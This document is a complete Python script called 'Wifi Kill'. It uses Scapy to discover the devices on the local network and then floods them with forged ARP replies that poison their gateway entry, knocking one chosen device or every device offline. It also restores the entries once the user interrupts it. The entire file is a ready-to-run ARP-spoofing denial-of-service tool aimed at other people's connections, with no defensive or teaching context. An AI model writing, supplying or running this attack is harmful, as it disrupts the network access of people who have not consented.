#!/usr/bin/env python3
"""
Wifi Kill
Robert Glew (adjusted for Python 3 & modern Scapy)

This script can be used to kick anyone or everyone off your Wi‑Fi network.
It must be run as root (sudo) in order to send the required packets.
"""

import os
import socket
import logging
import time
from scapy.all import arping, ARP, send, conf, get_if_hwaddr

# Silence Scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

def get_ip_macs(ips):
    """
    Returns a list of tuples (ip, mac) of all computers on the network.
    """
    answers, _ = arping(ips, verbose=0)
    res = []
    for sent, received in answers:
        res.append((received.psrc, received.hwsrc))
    return res

def poison(victim_ip, victim_mac, gateway_ip, src_mac):
    """
    Send the victim an ARP packet pairing the gateway IP with a wrong MAC
    (src_mac), effectively cutting its route to the router.
    """
    pkt = ARP(op=2,
              psrc=gateway_ip,
              hwsrc=src_mac,
              pdst=victim_ip,
              hwdst=victim_mac)
    send(pkt, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    """
    Send the victim an ARP packet pairing the gateway IP with the correct MAC,
    restoring normal connectivity.
    """
    pkt = ARP(op=2,
              psrc=gateway_ip,
              hwsrc=gateway_mac,
              pdst=victim_ip,
              hwdst=victim_mac)
    send(pkt, verbose=0)

def get_lan_ip():
    """
    Obtains the current LAN IP address by opening a UDP socket to the internet.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def print_divider():
    print('-' * 40)

def main():
    # must be root
    if os.geteuid() != 0:
        print("You need to run the script as root/sudo.")
        return

    # determine your interface MAC to use as spoof source
    iface = conf.iface
    src_mac = get_if_hwaddr(iface)

    refreshing = True
    gateway_mac = None

    while refreshing:
        # build IP range and gateway IP
        my_ip = get_lan_ip()
        octets = my_ip.split('.')
        gateway_ip = '.'.join(octets[:3] + ['1'])
        ip_range = '.'.join(octets[:3] + ['0/24'])

        # discover devices
        devices = get_ip_macs(ip_range)

        print_divider()
        print("Connected devices:")
        for idx, (ip, mac) in enumerate(devices):
            print(f"{idx}) {ip}\t{mac}")
            if ip == gateway_ip:
                gateway_mac = mac
        print_divider()

        print(f"Assumed gateway IP: {gateway_ip}")
        if gateway_mac:
            print(f"Detected gateway MAC: {gateway_mac}")
        else:
            print("⚠️  Gateway MAC not found – cannot restore later!")
        print_divider()

        print("Who do you want to boot?")
        print("(r) Refresh, (a) Kill all, (q) Quit")

        choice = None
        kill_all = False
        while True:
            cmd = input("> ").strip().lower()
            if cmd == 'r':
                break
            if cmd == 'a':
                kill_all = True
                choice = 'a'
                refreshing = False
                break
            if cmd == 'q':
                return
            if cmd.isdigit() and 0 <= int(cmd) < len(devices):
                choice = int(cmd)
                refreshing = False
                break
            print("Enter a valid option (r, a, q or device number).")

    # launch the attack
    try:
        if choice == 'a':
            print("Killing ALL devices... (Ctrl+C to stop)")
            while True:
                for ip, mac in devices:
                    poison(ip, mac, gateway_ip, src_mac)

        else:
            victim_ip, victim_mac = devices[choice]
            print(f"Preventing {victim_ip} from accessing the internet... (Ctrl+C to stop)")
            while True:
                poison(victim_ip, victim_mac, gateway_ip, src_mac)

    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        if choice == 'a':
            for ip, mac in devices:
                if gateway_mac:
                    restore(ip, mac, gateway_ip, gateway_mac)
        else:
            if gateway_mac:
                restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        print("Done. You're welcome!")

if __name__ == "__main__":
    main()
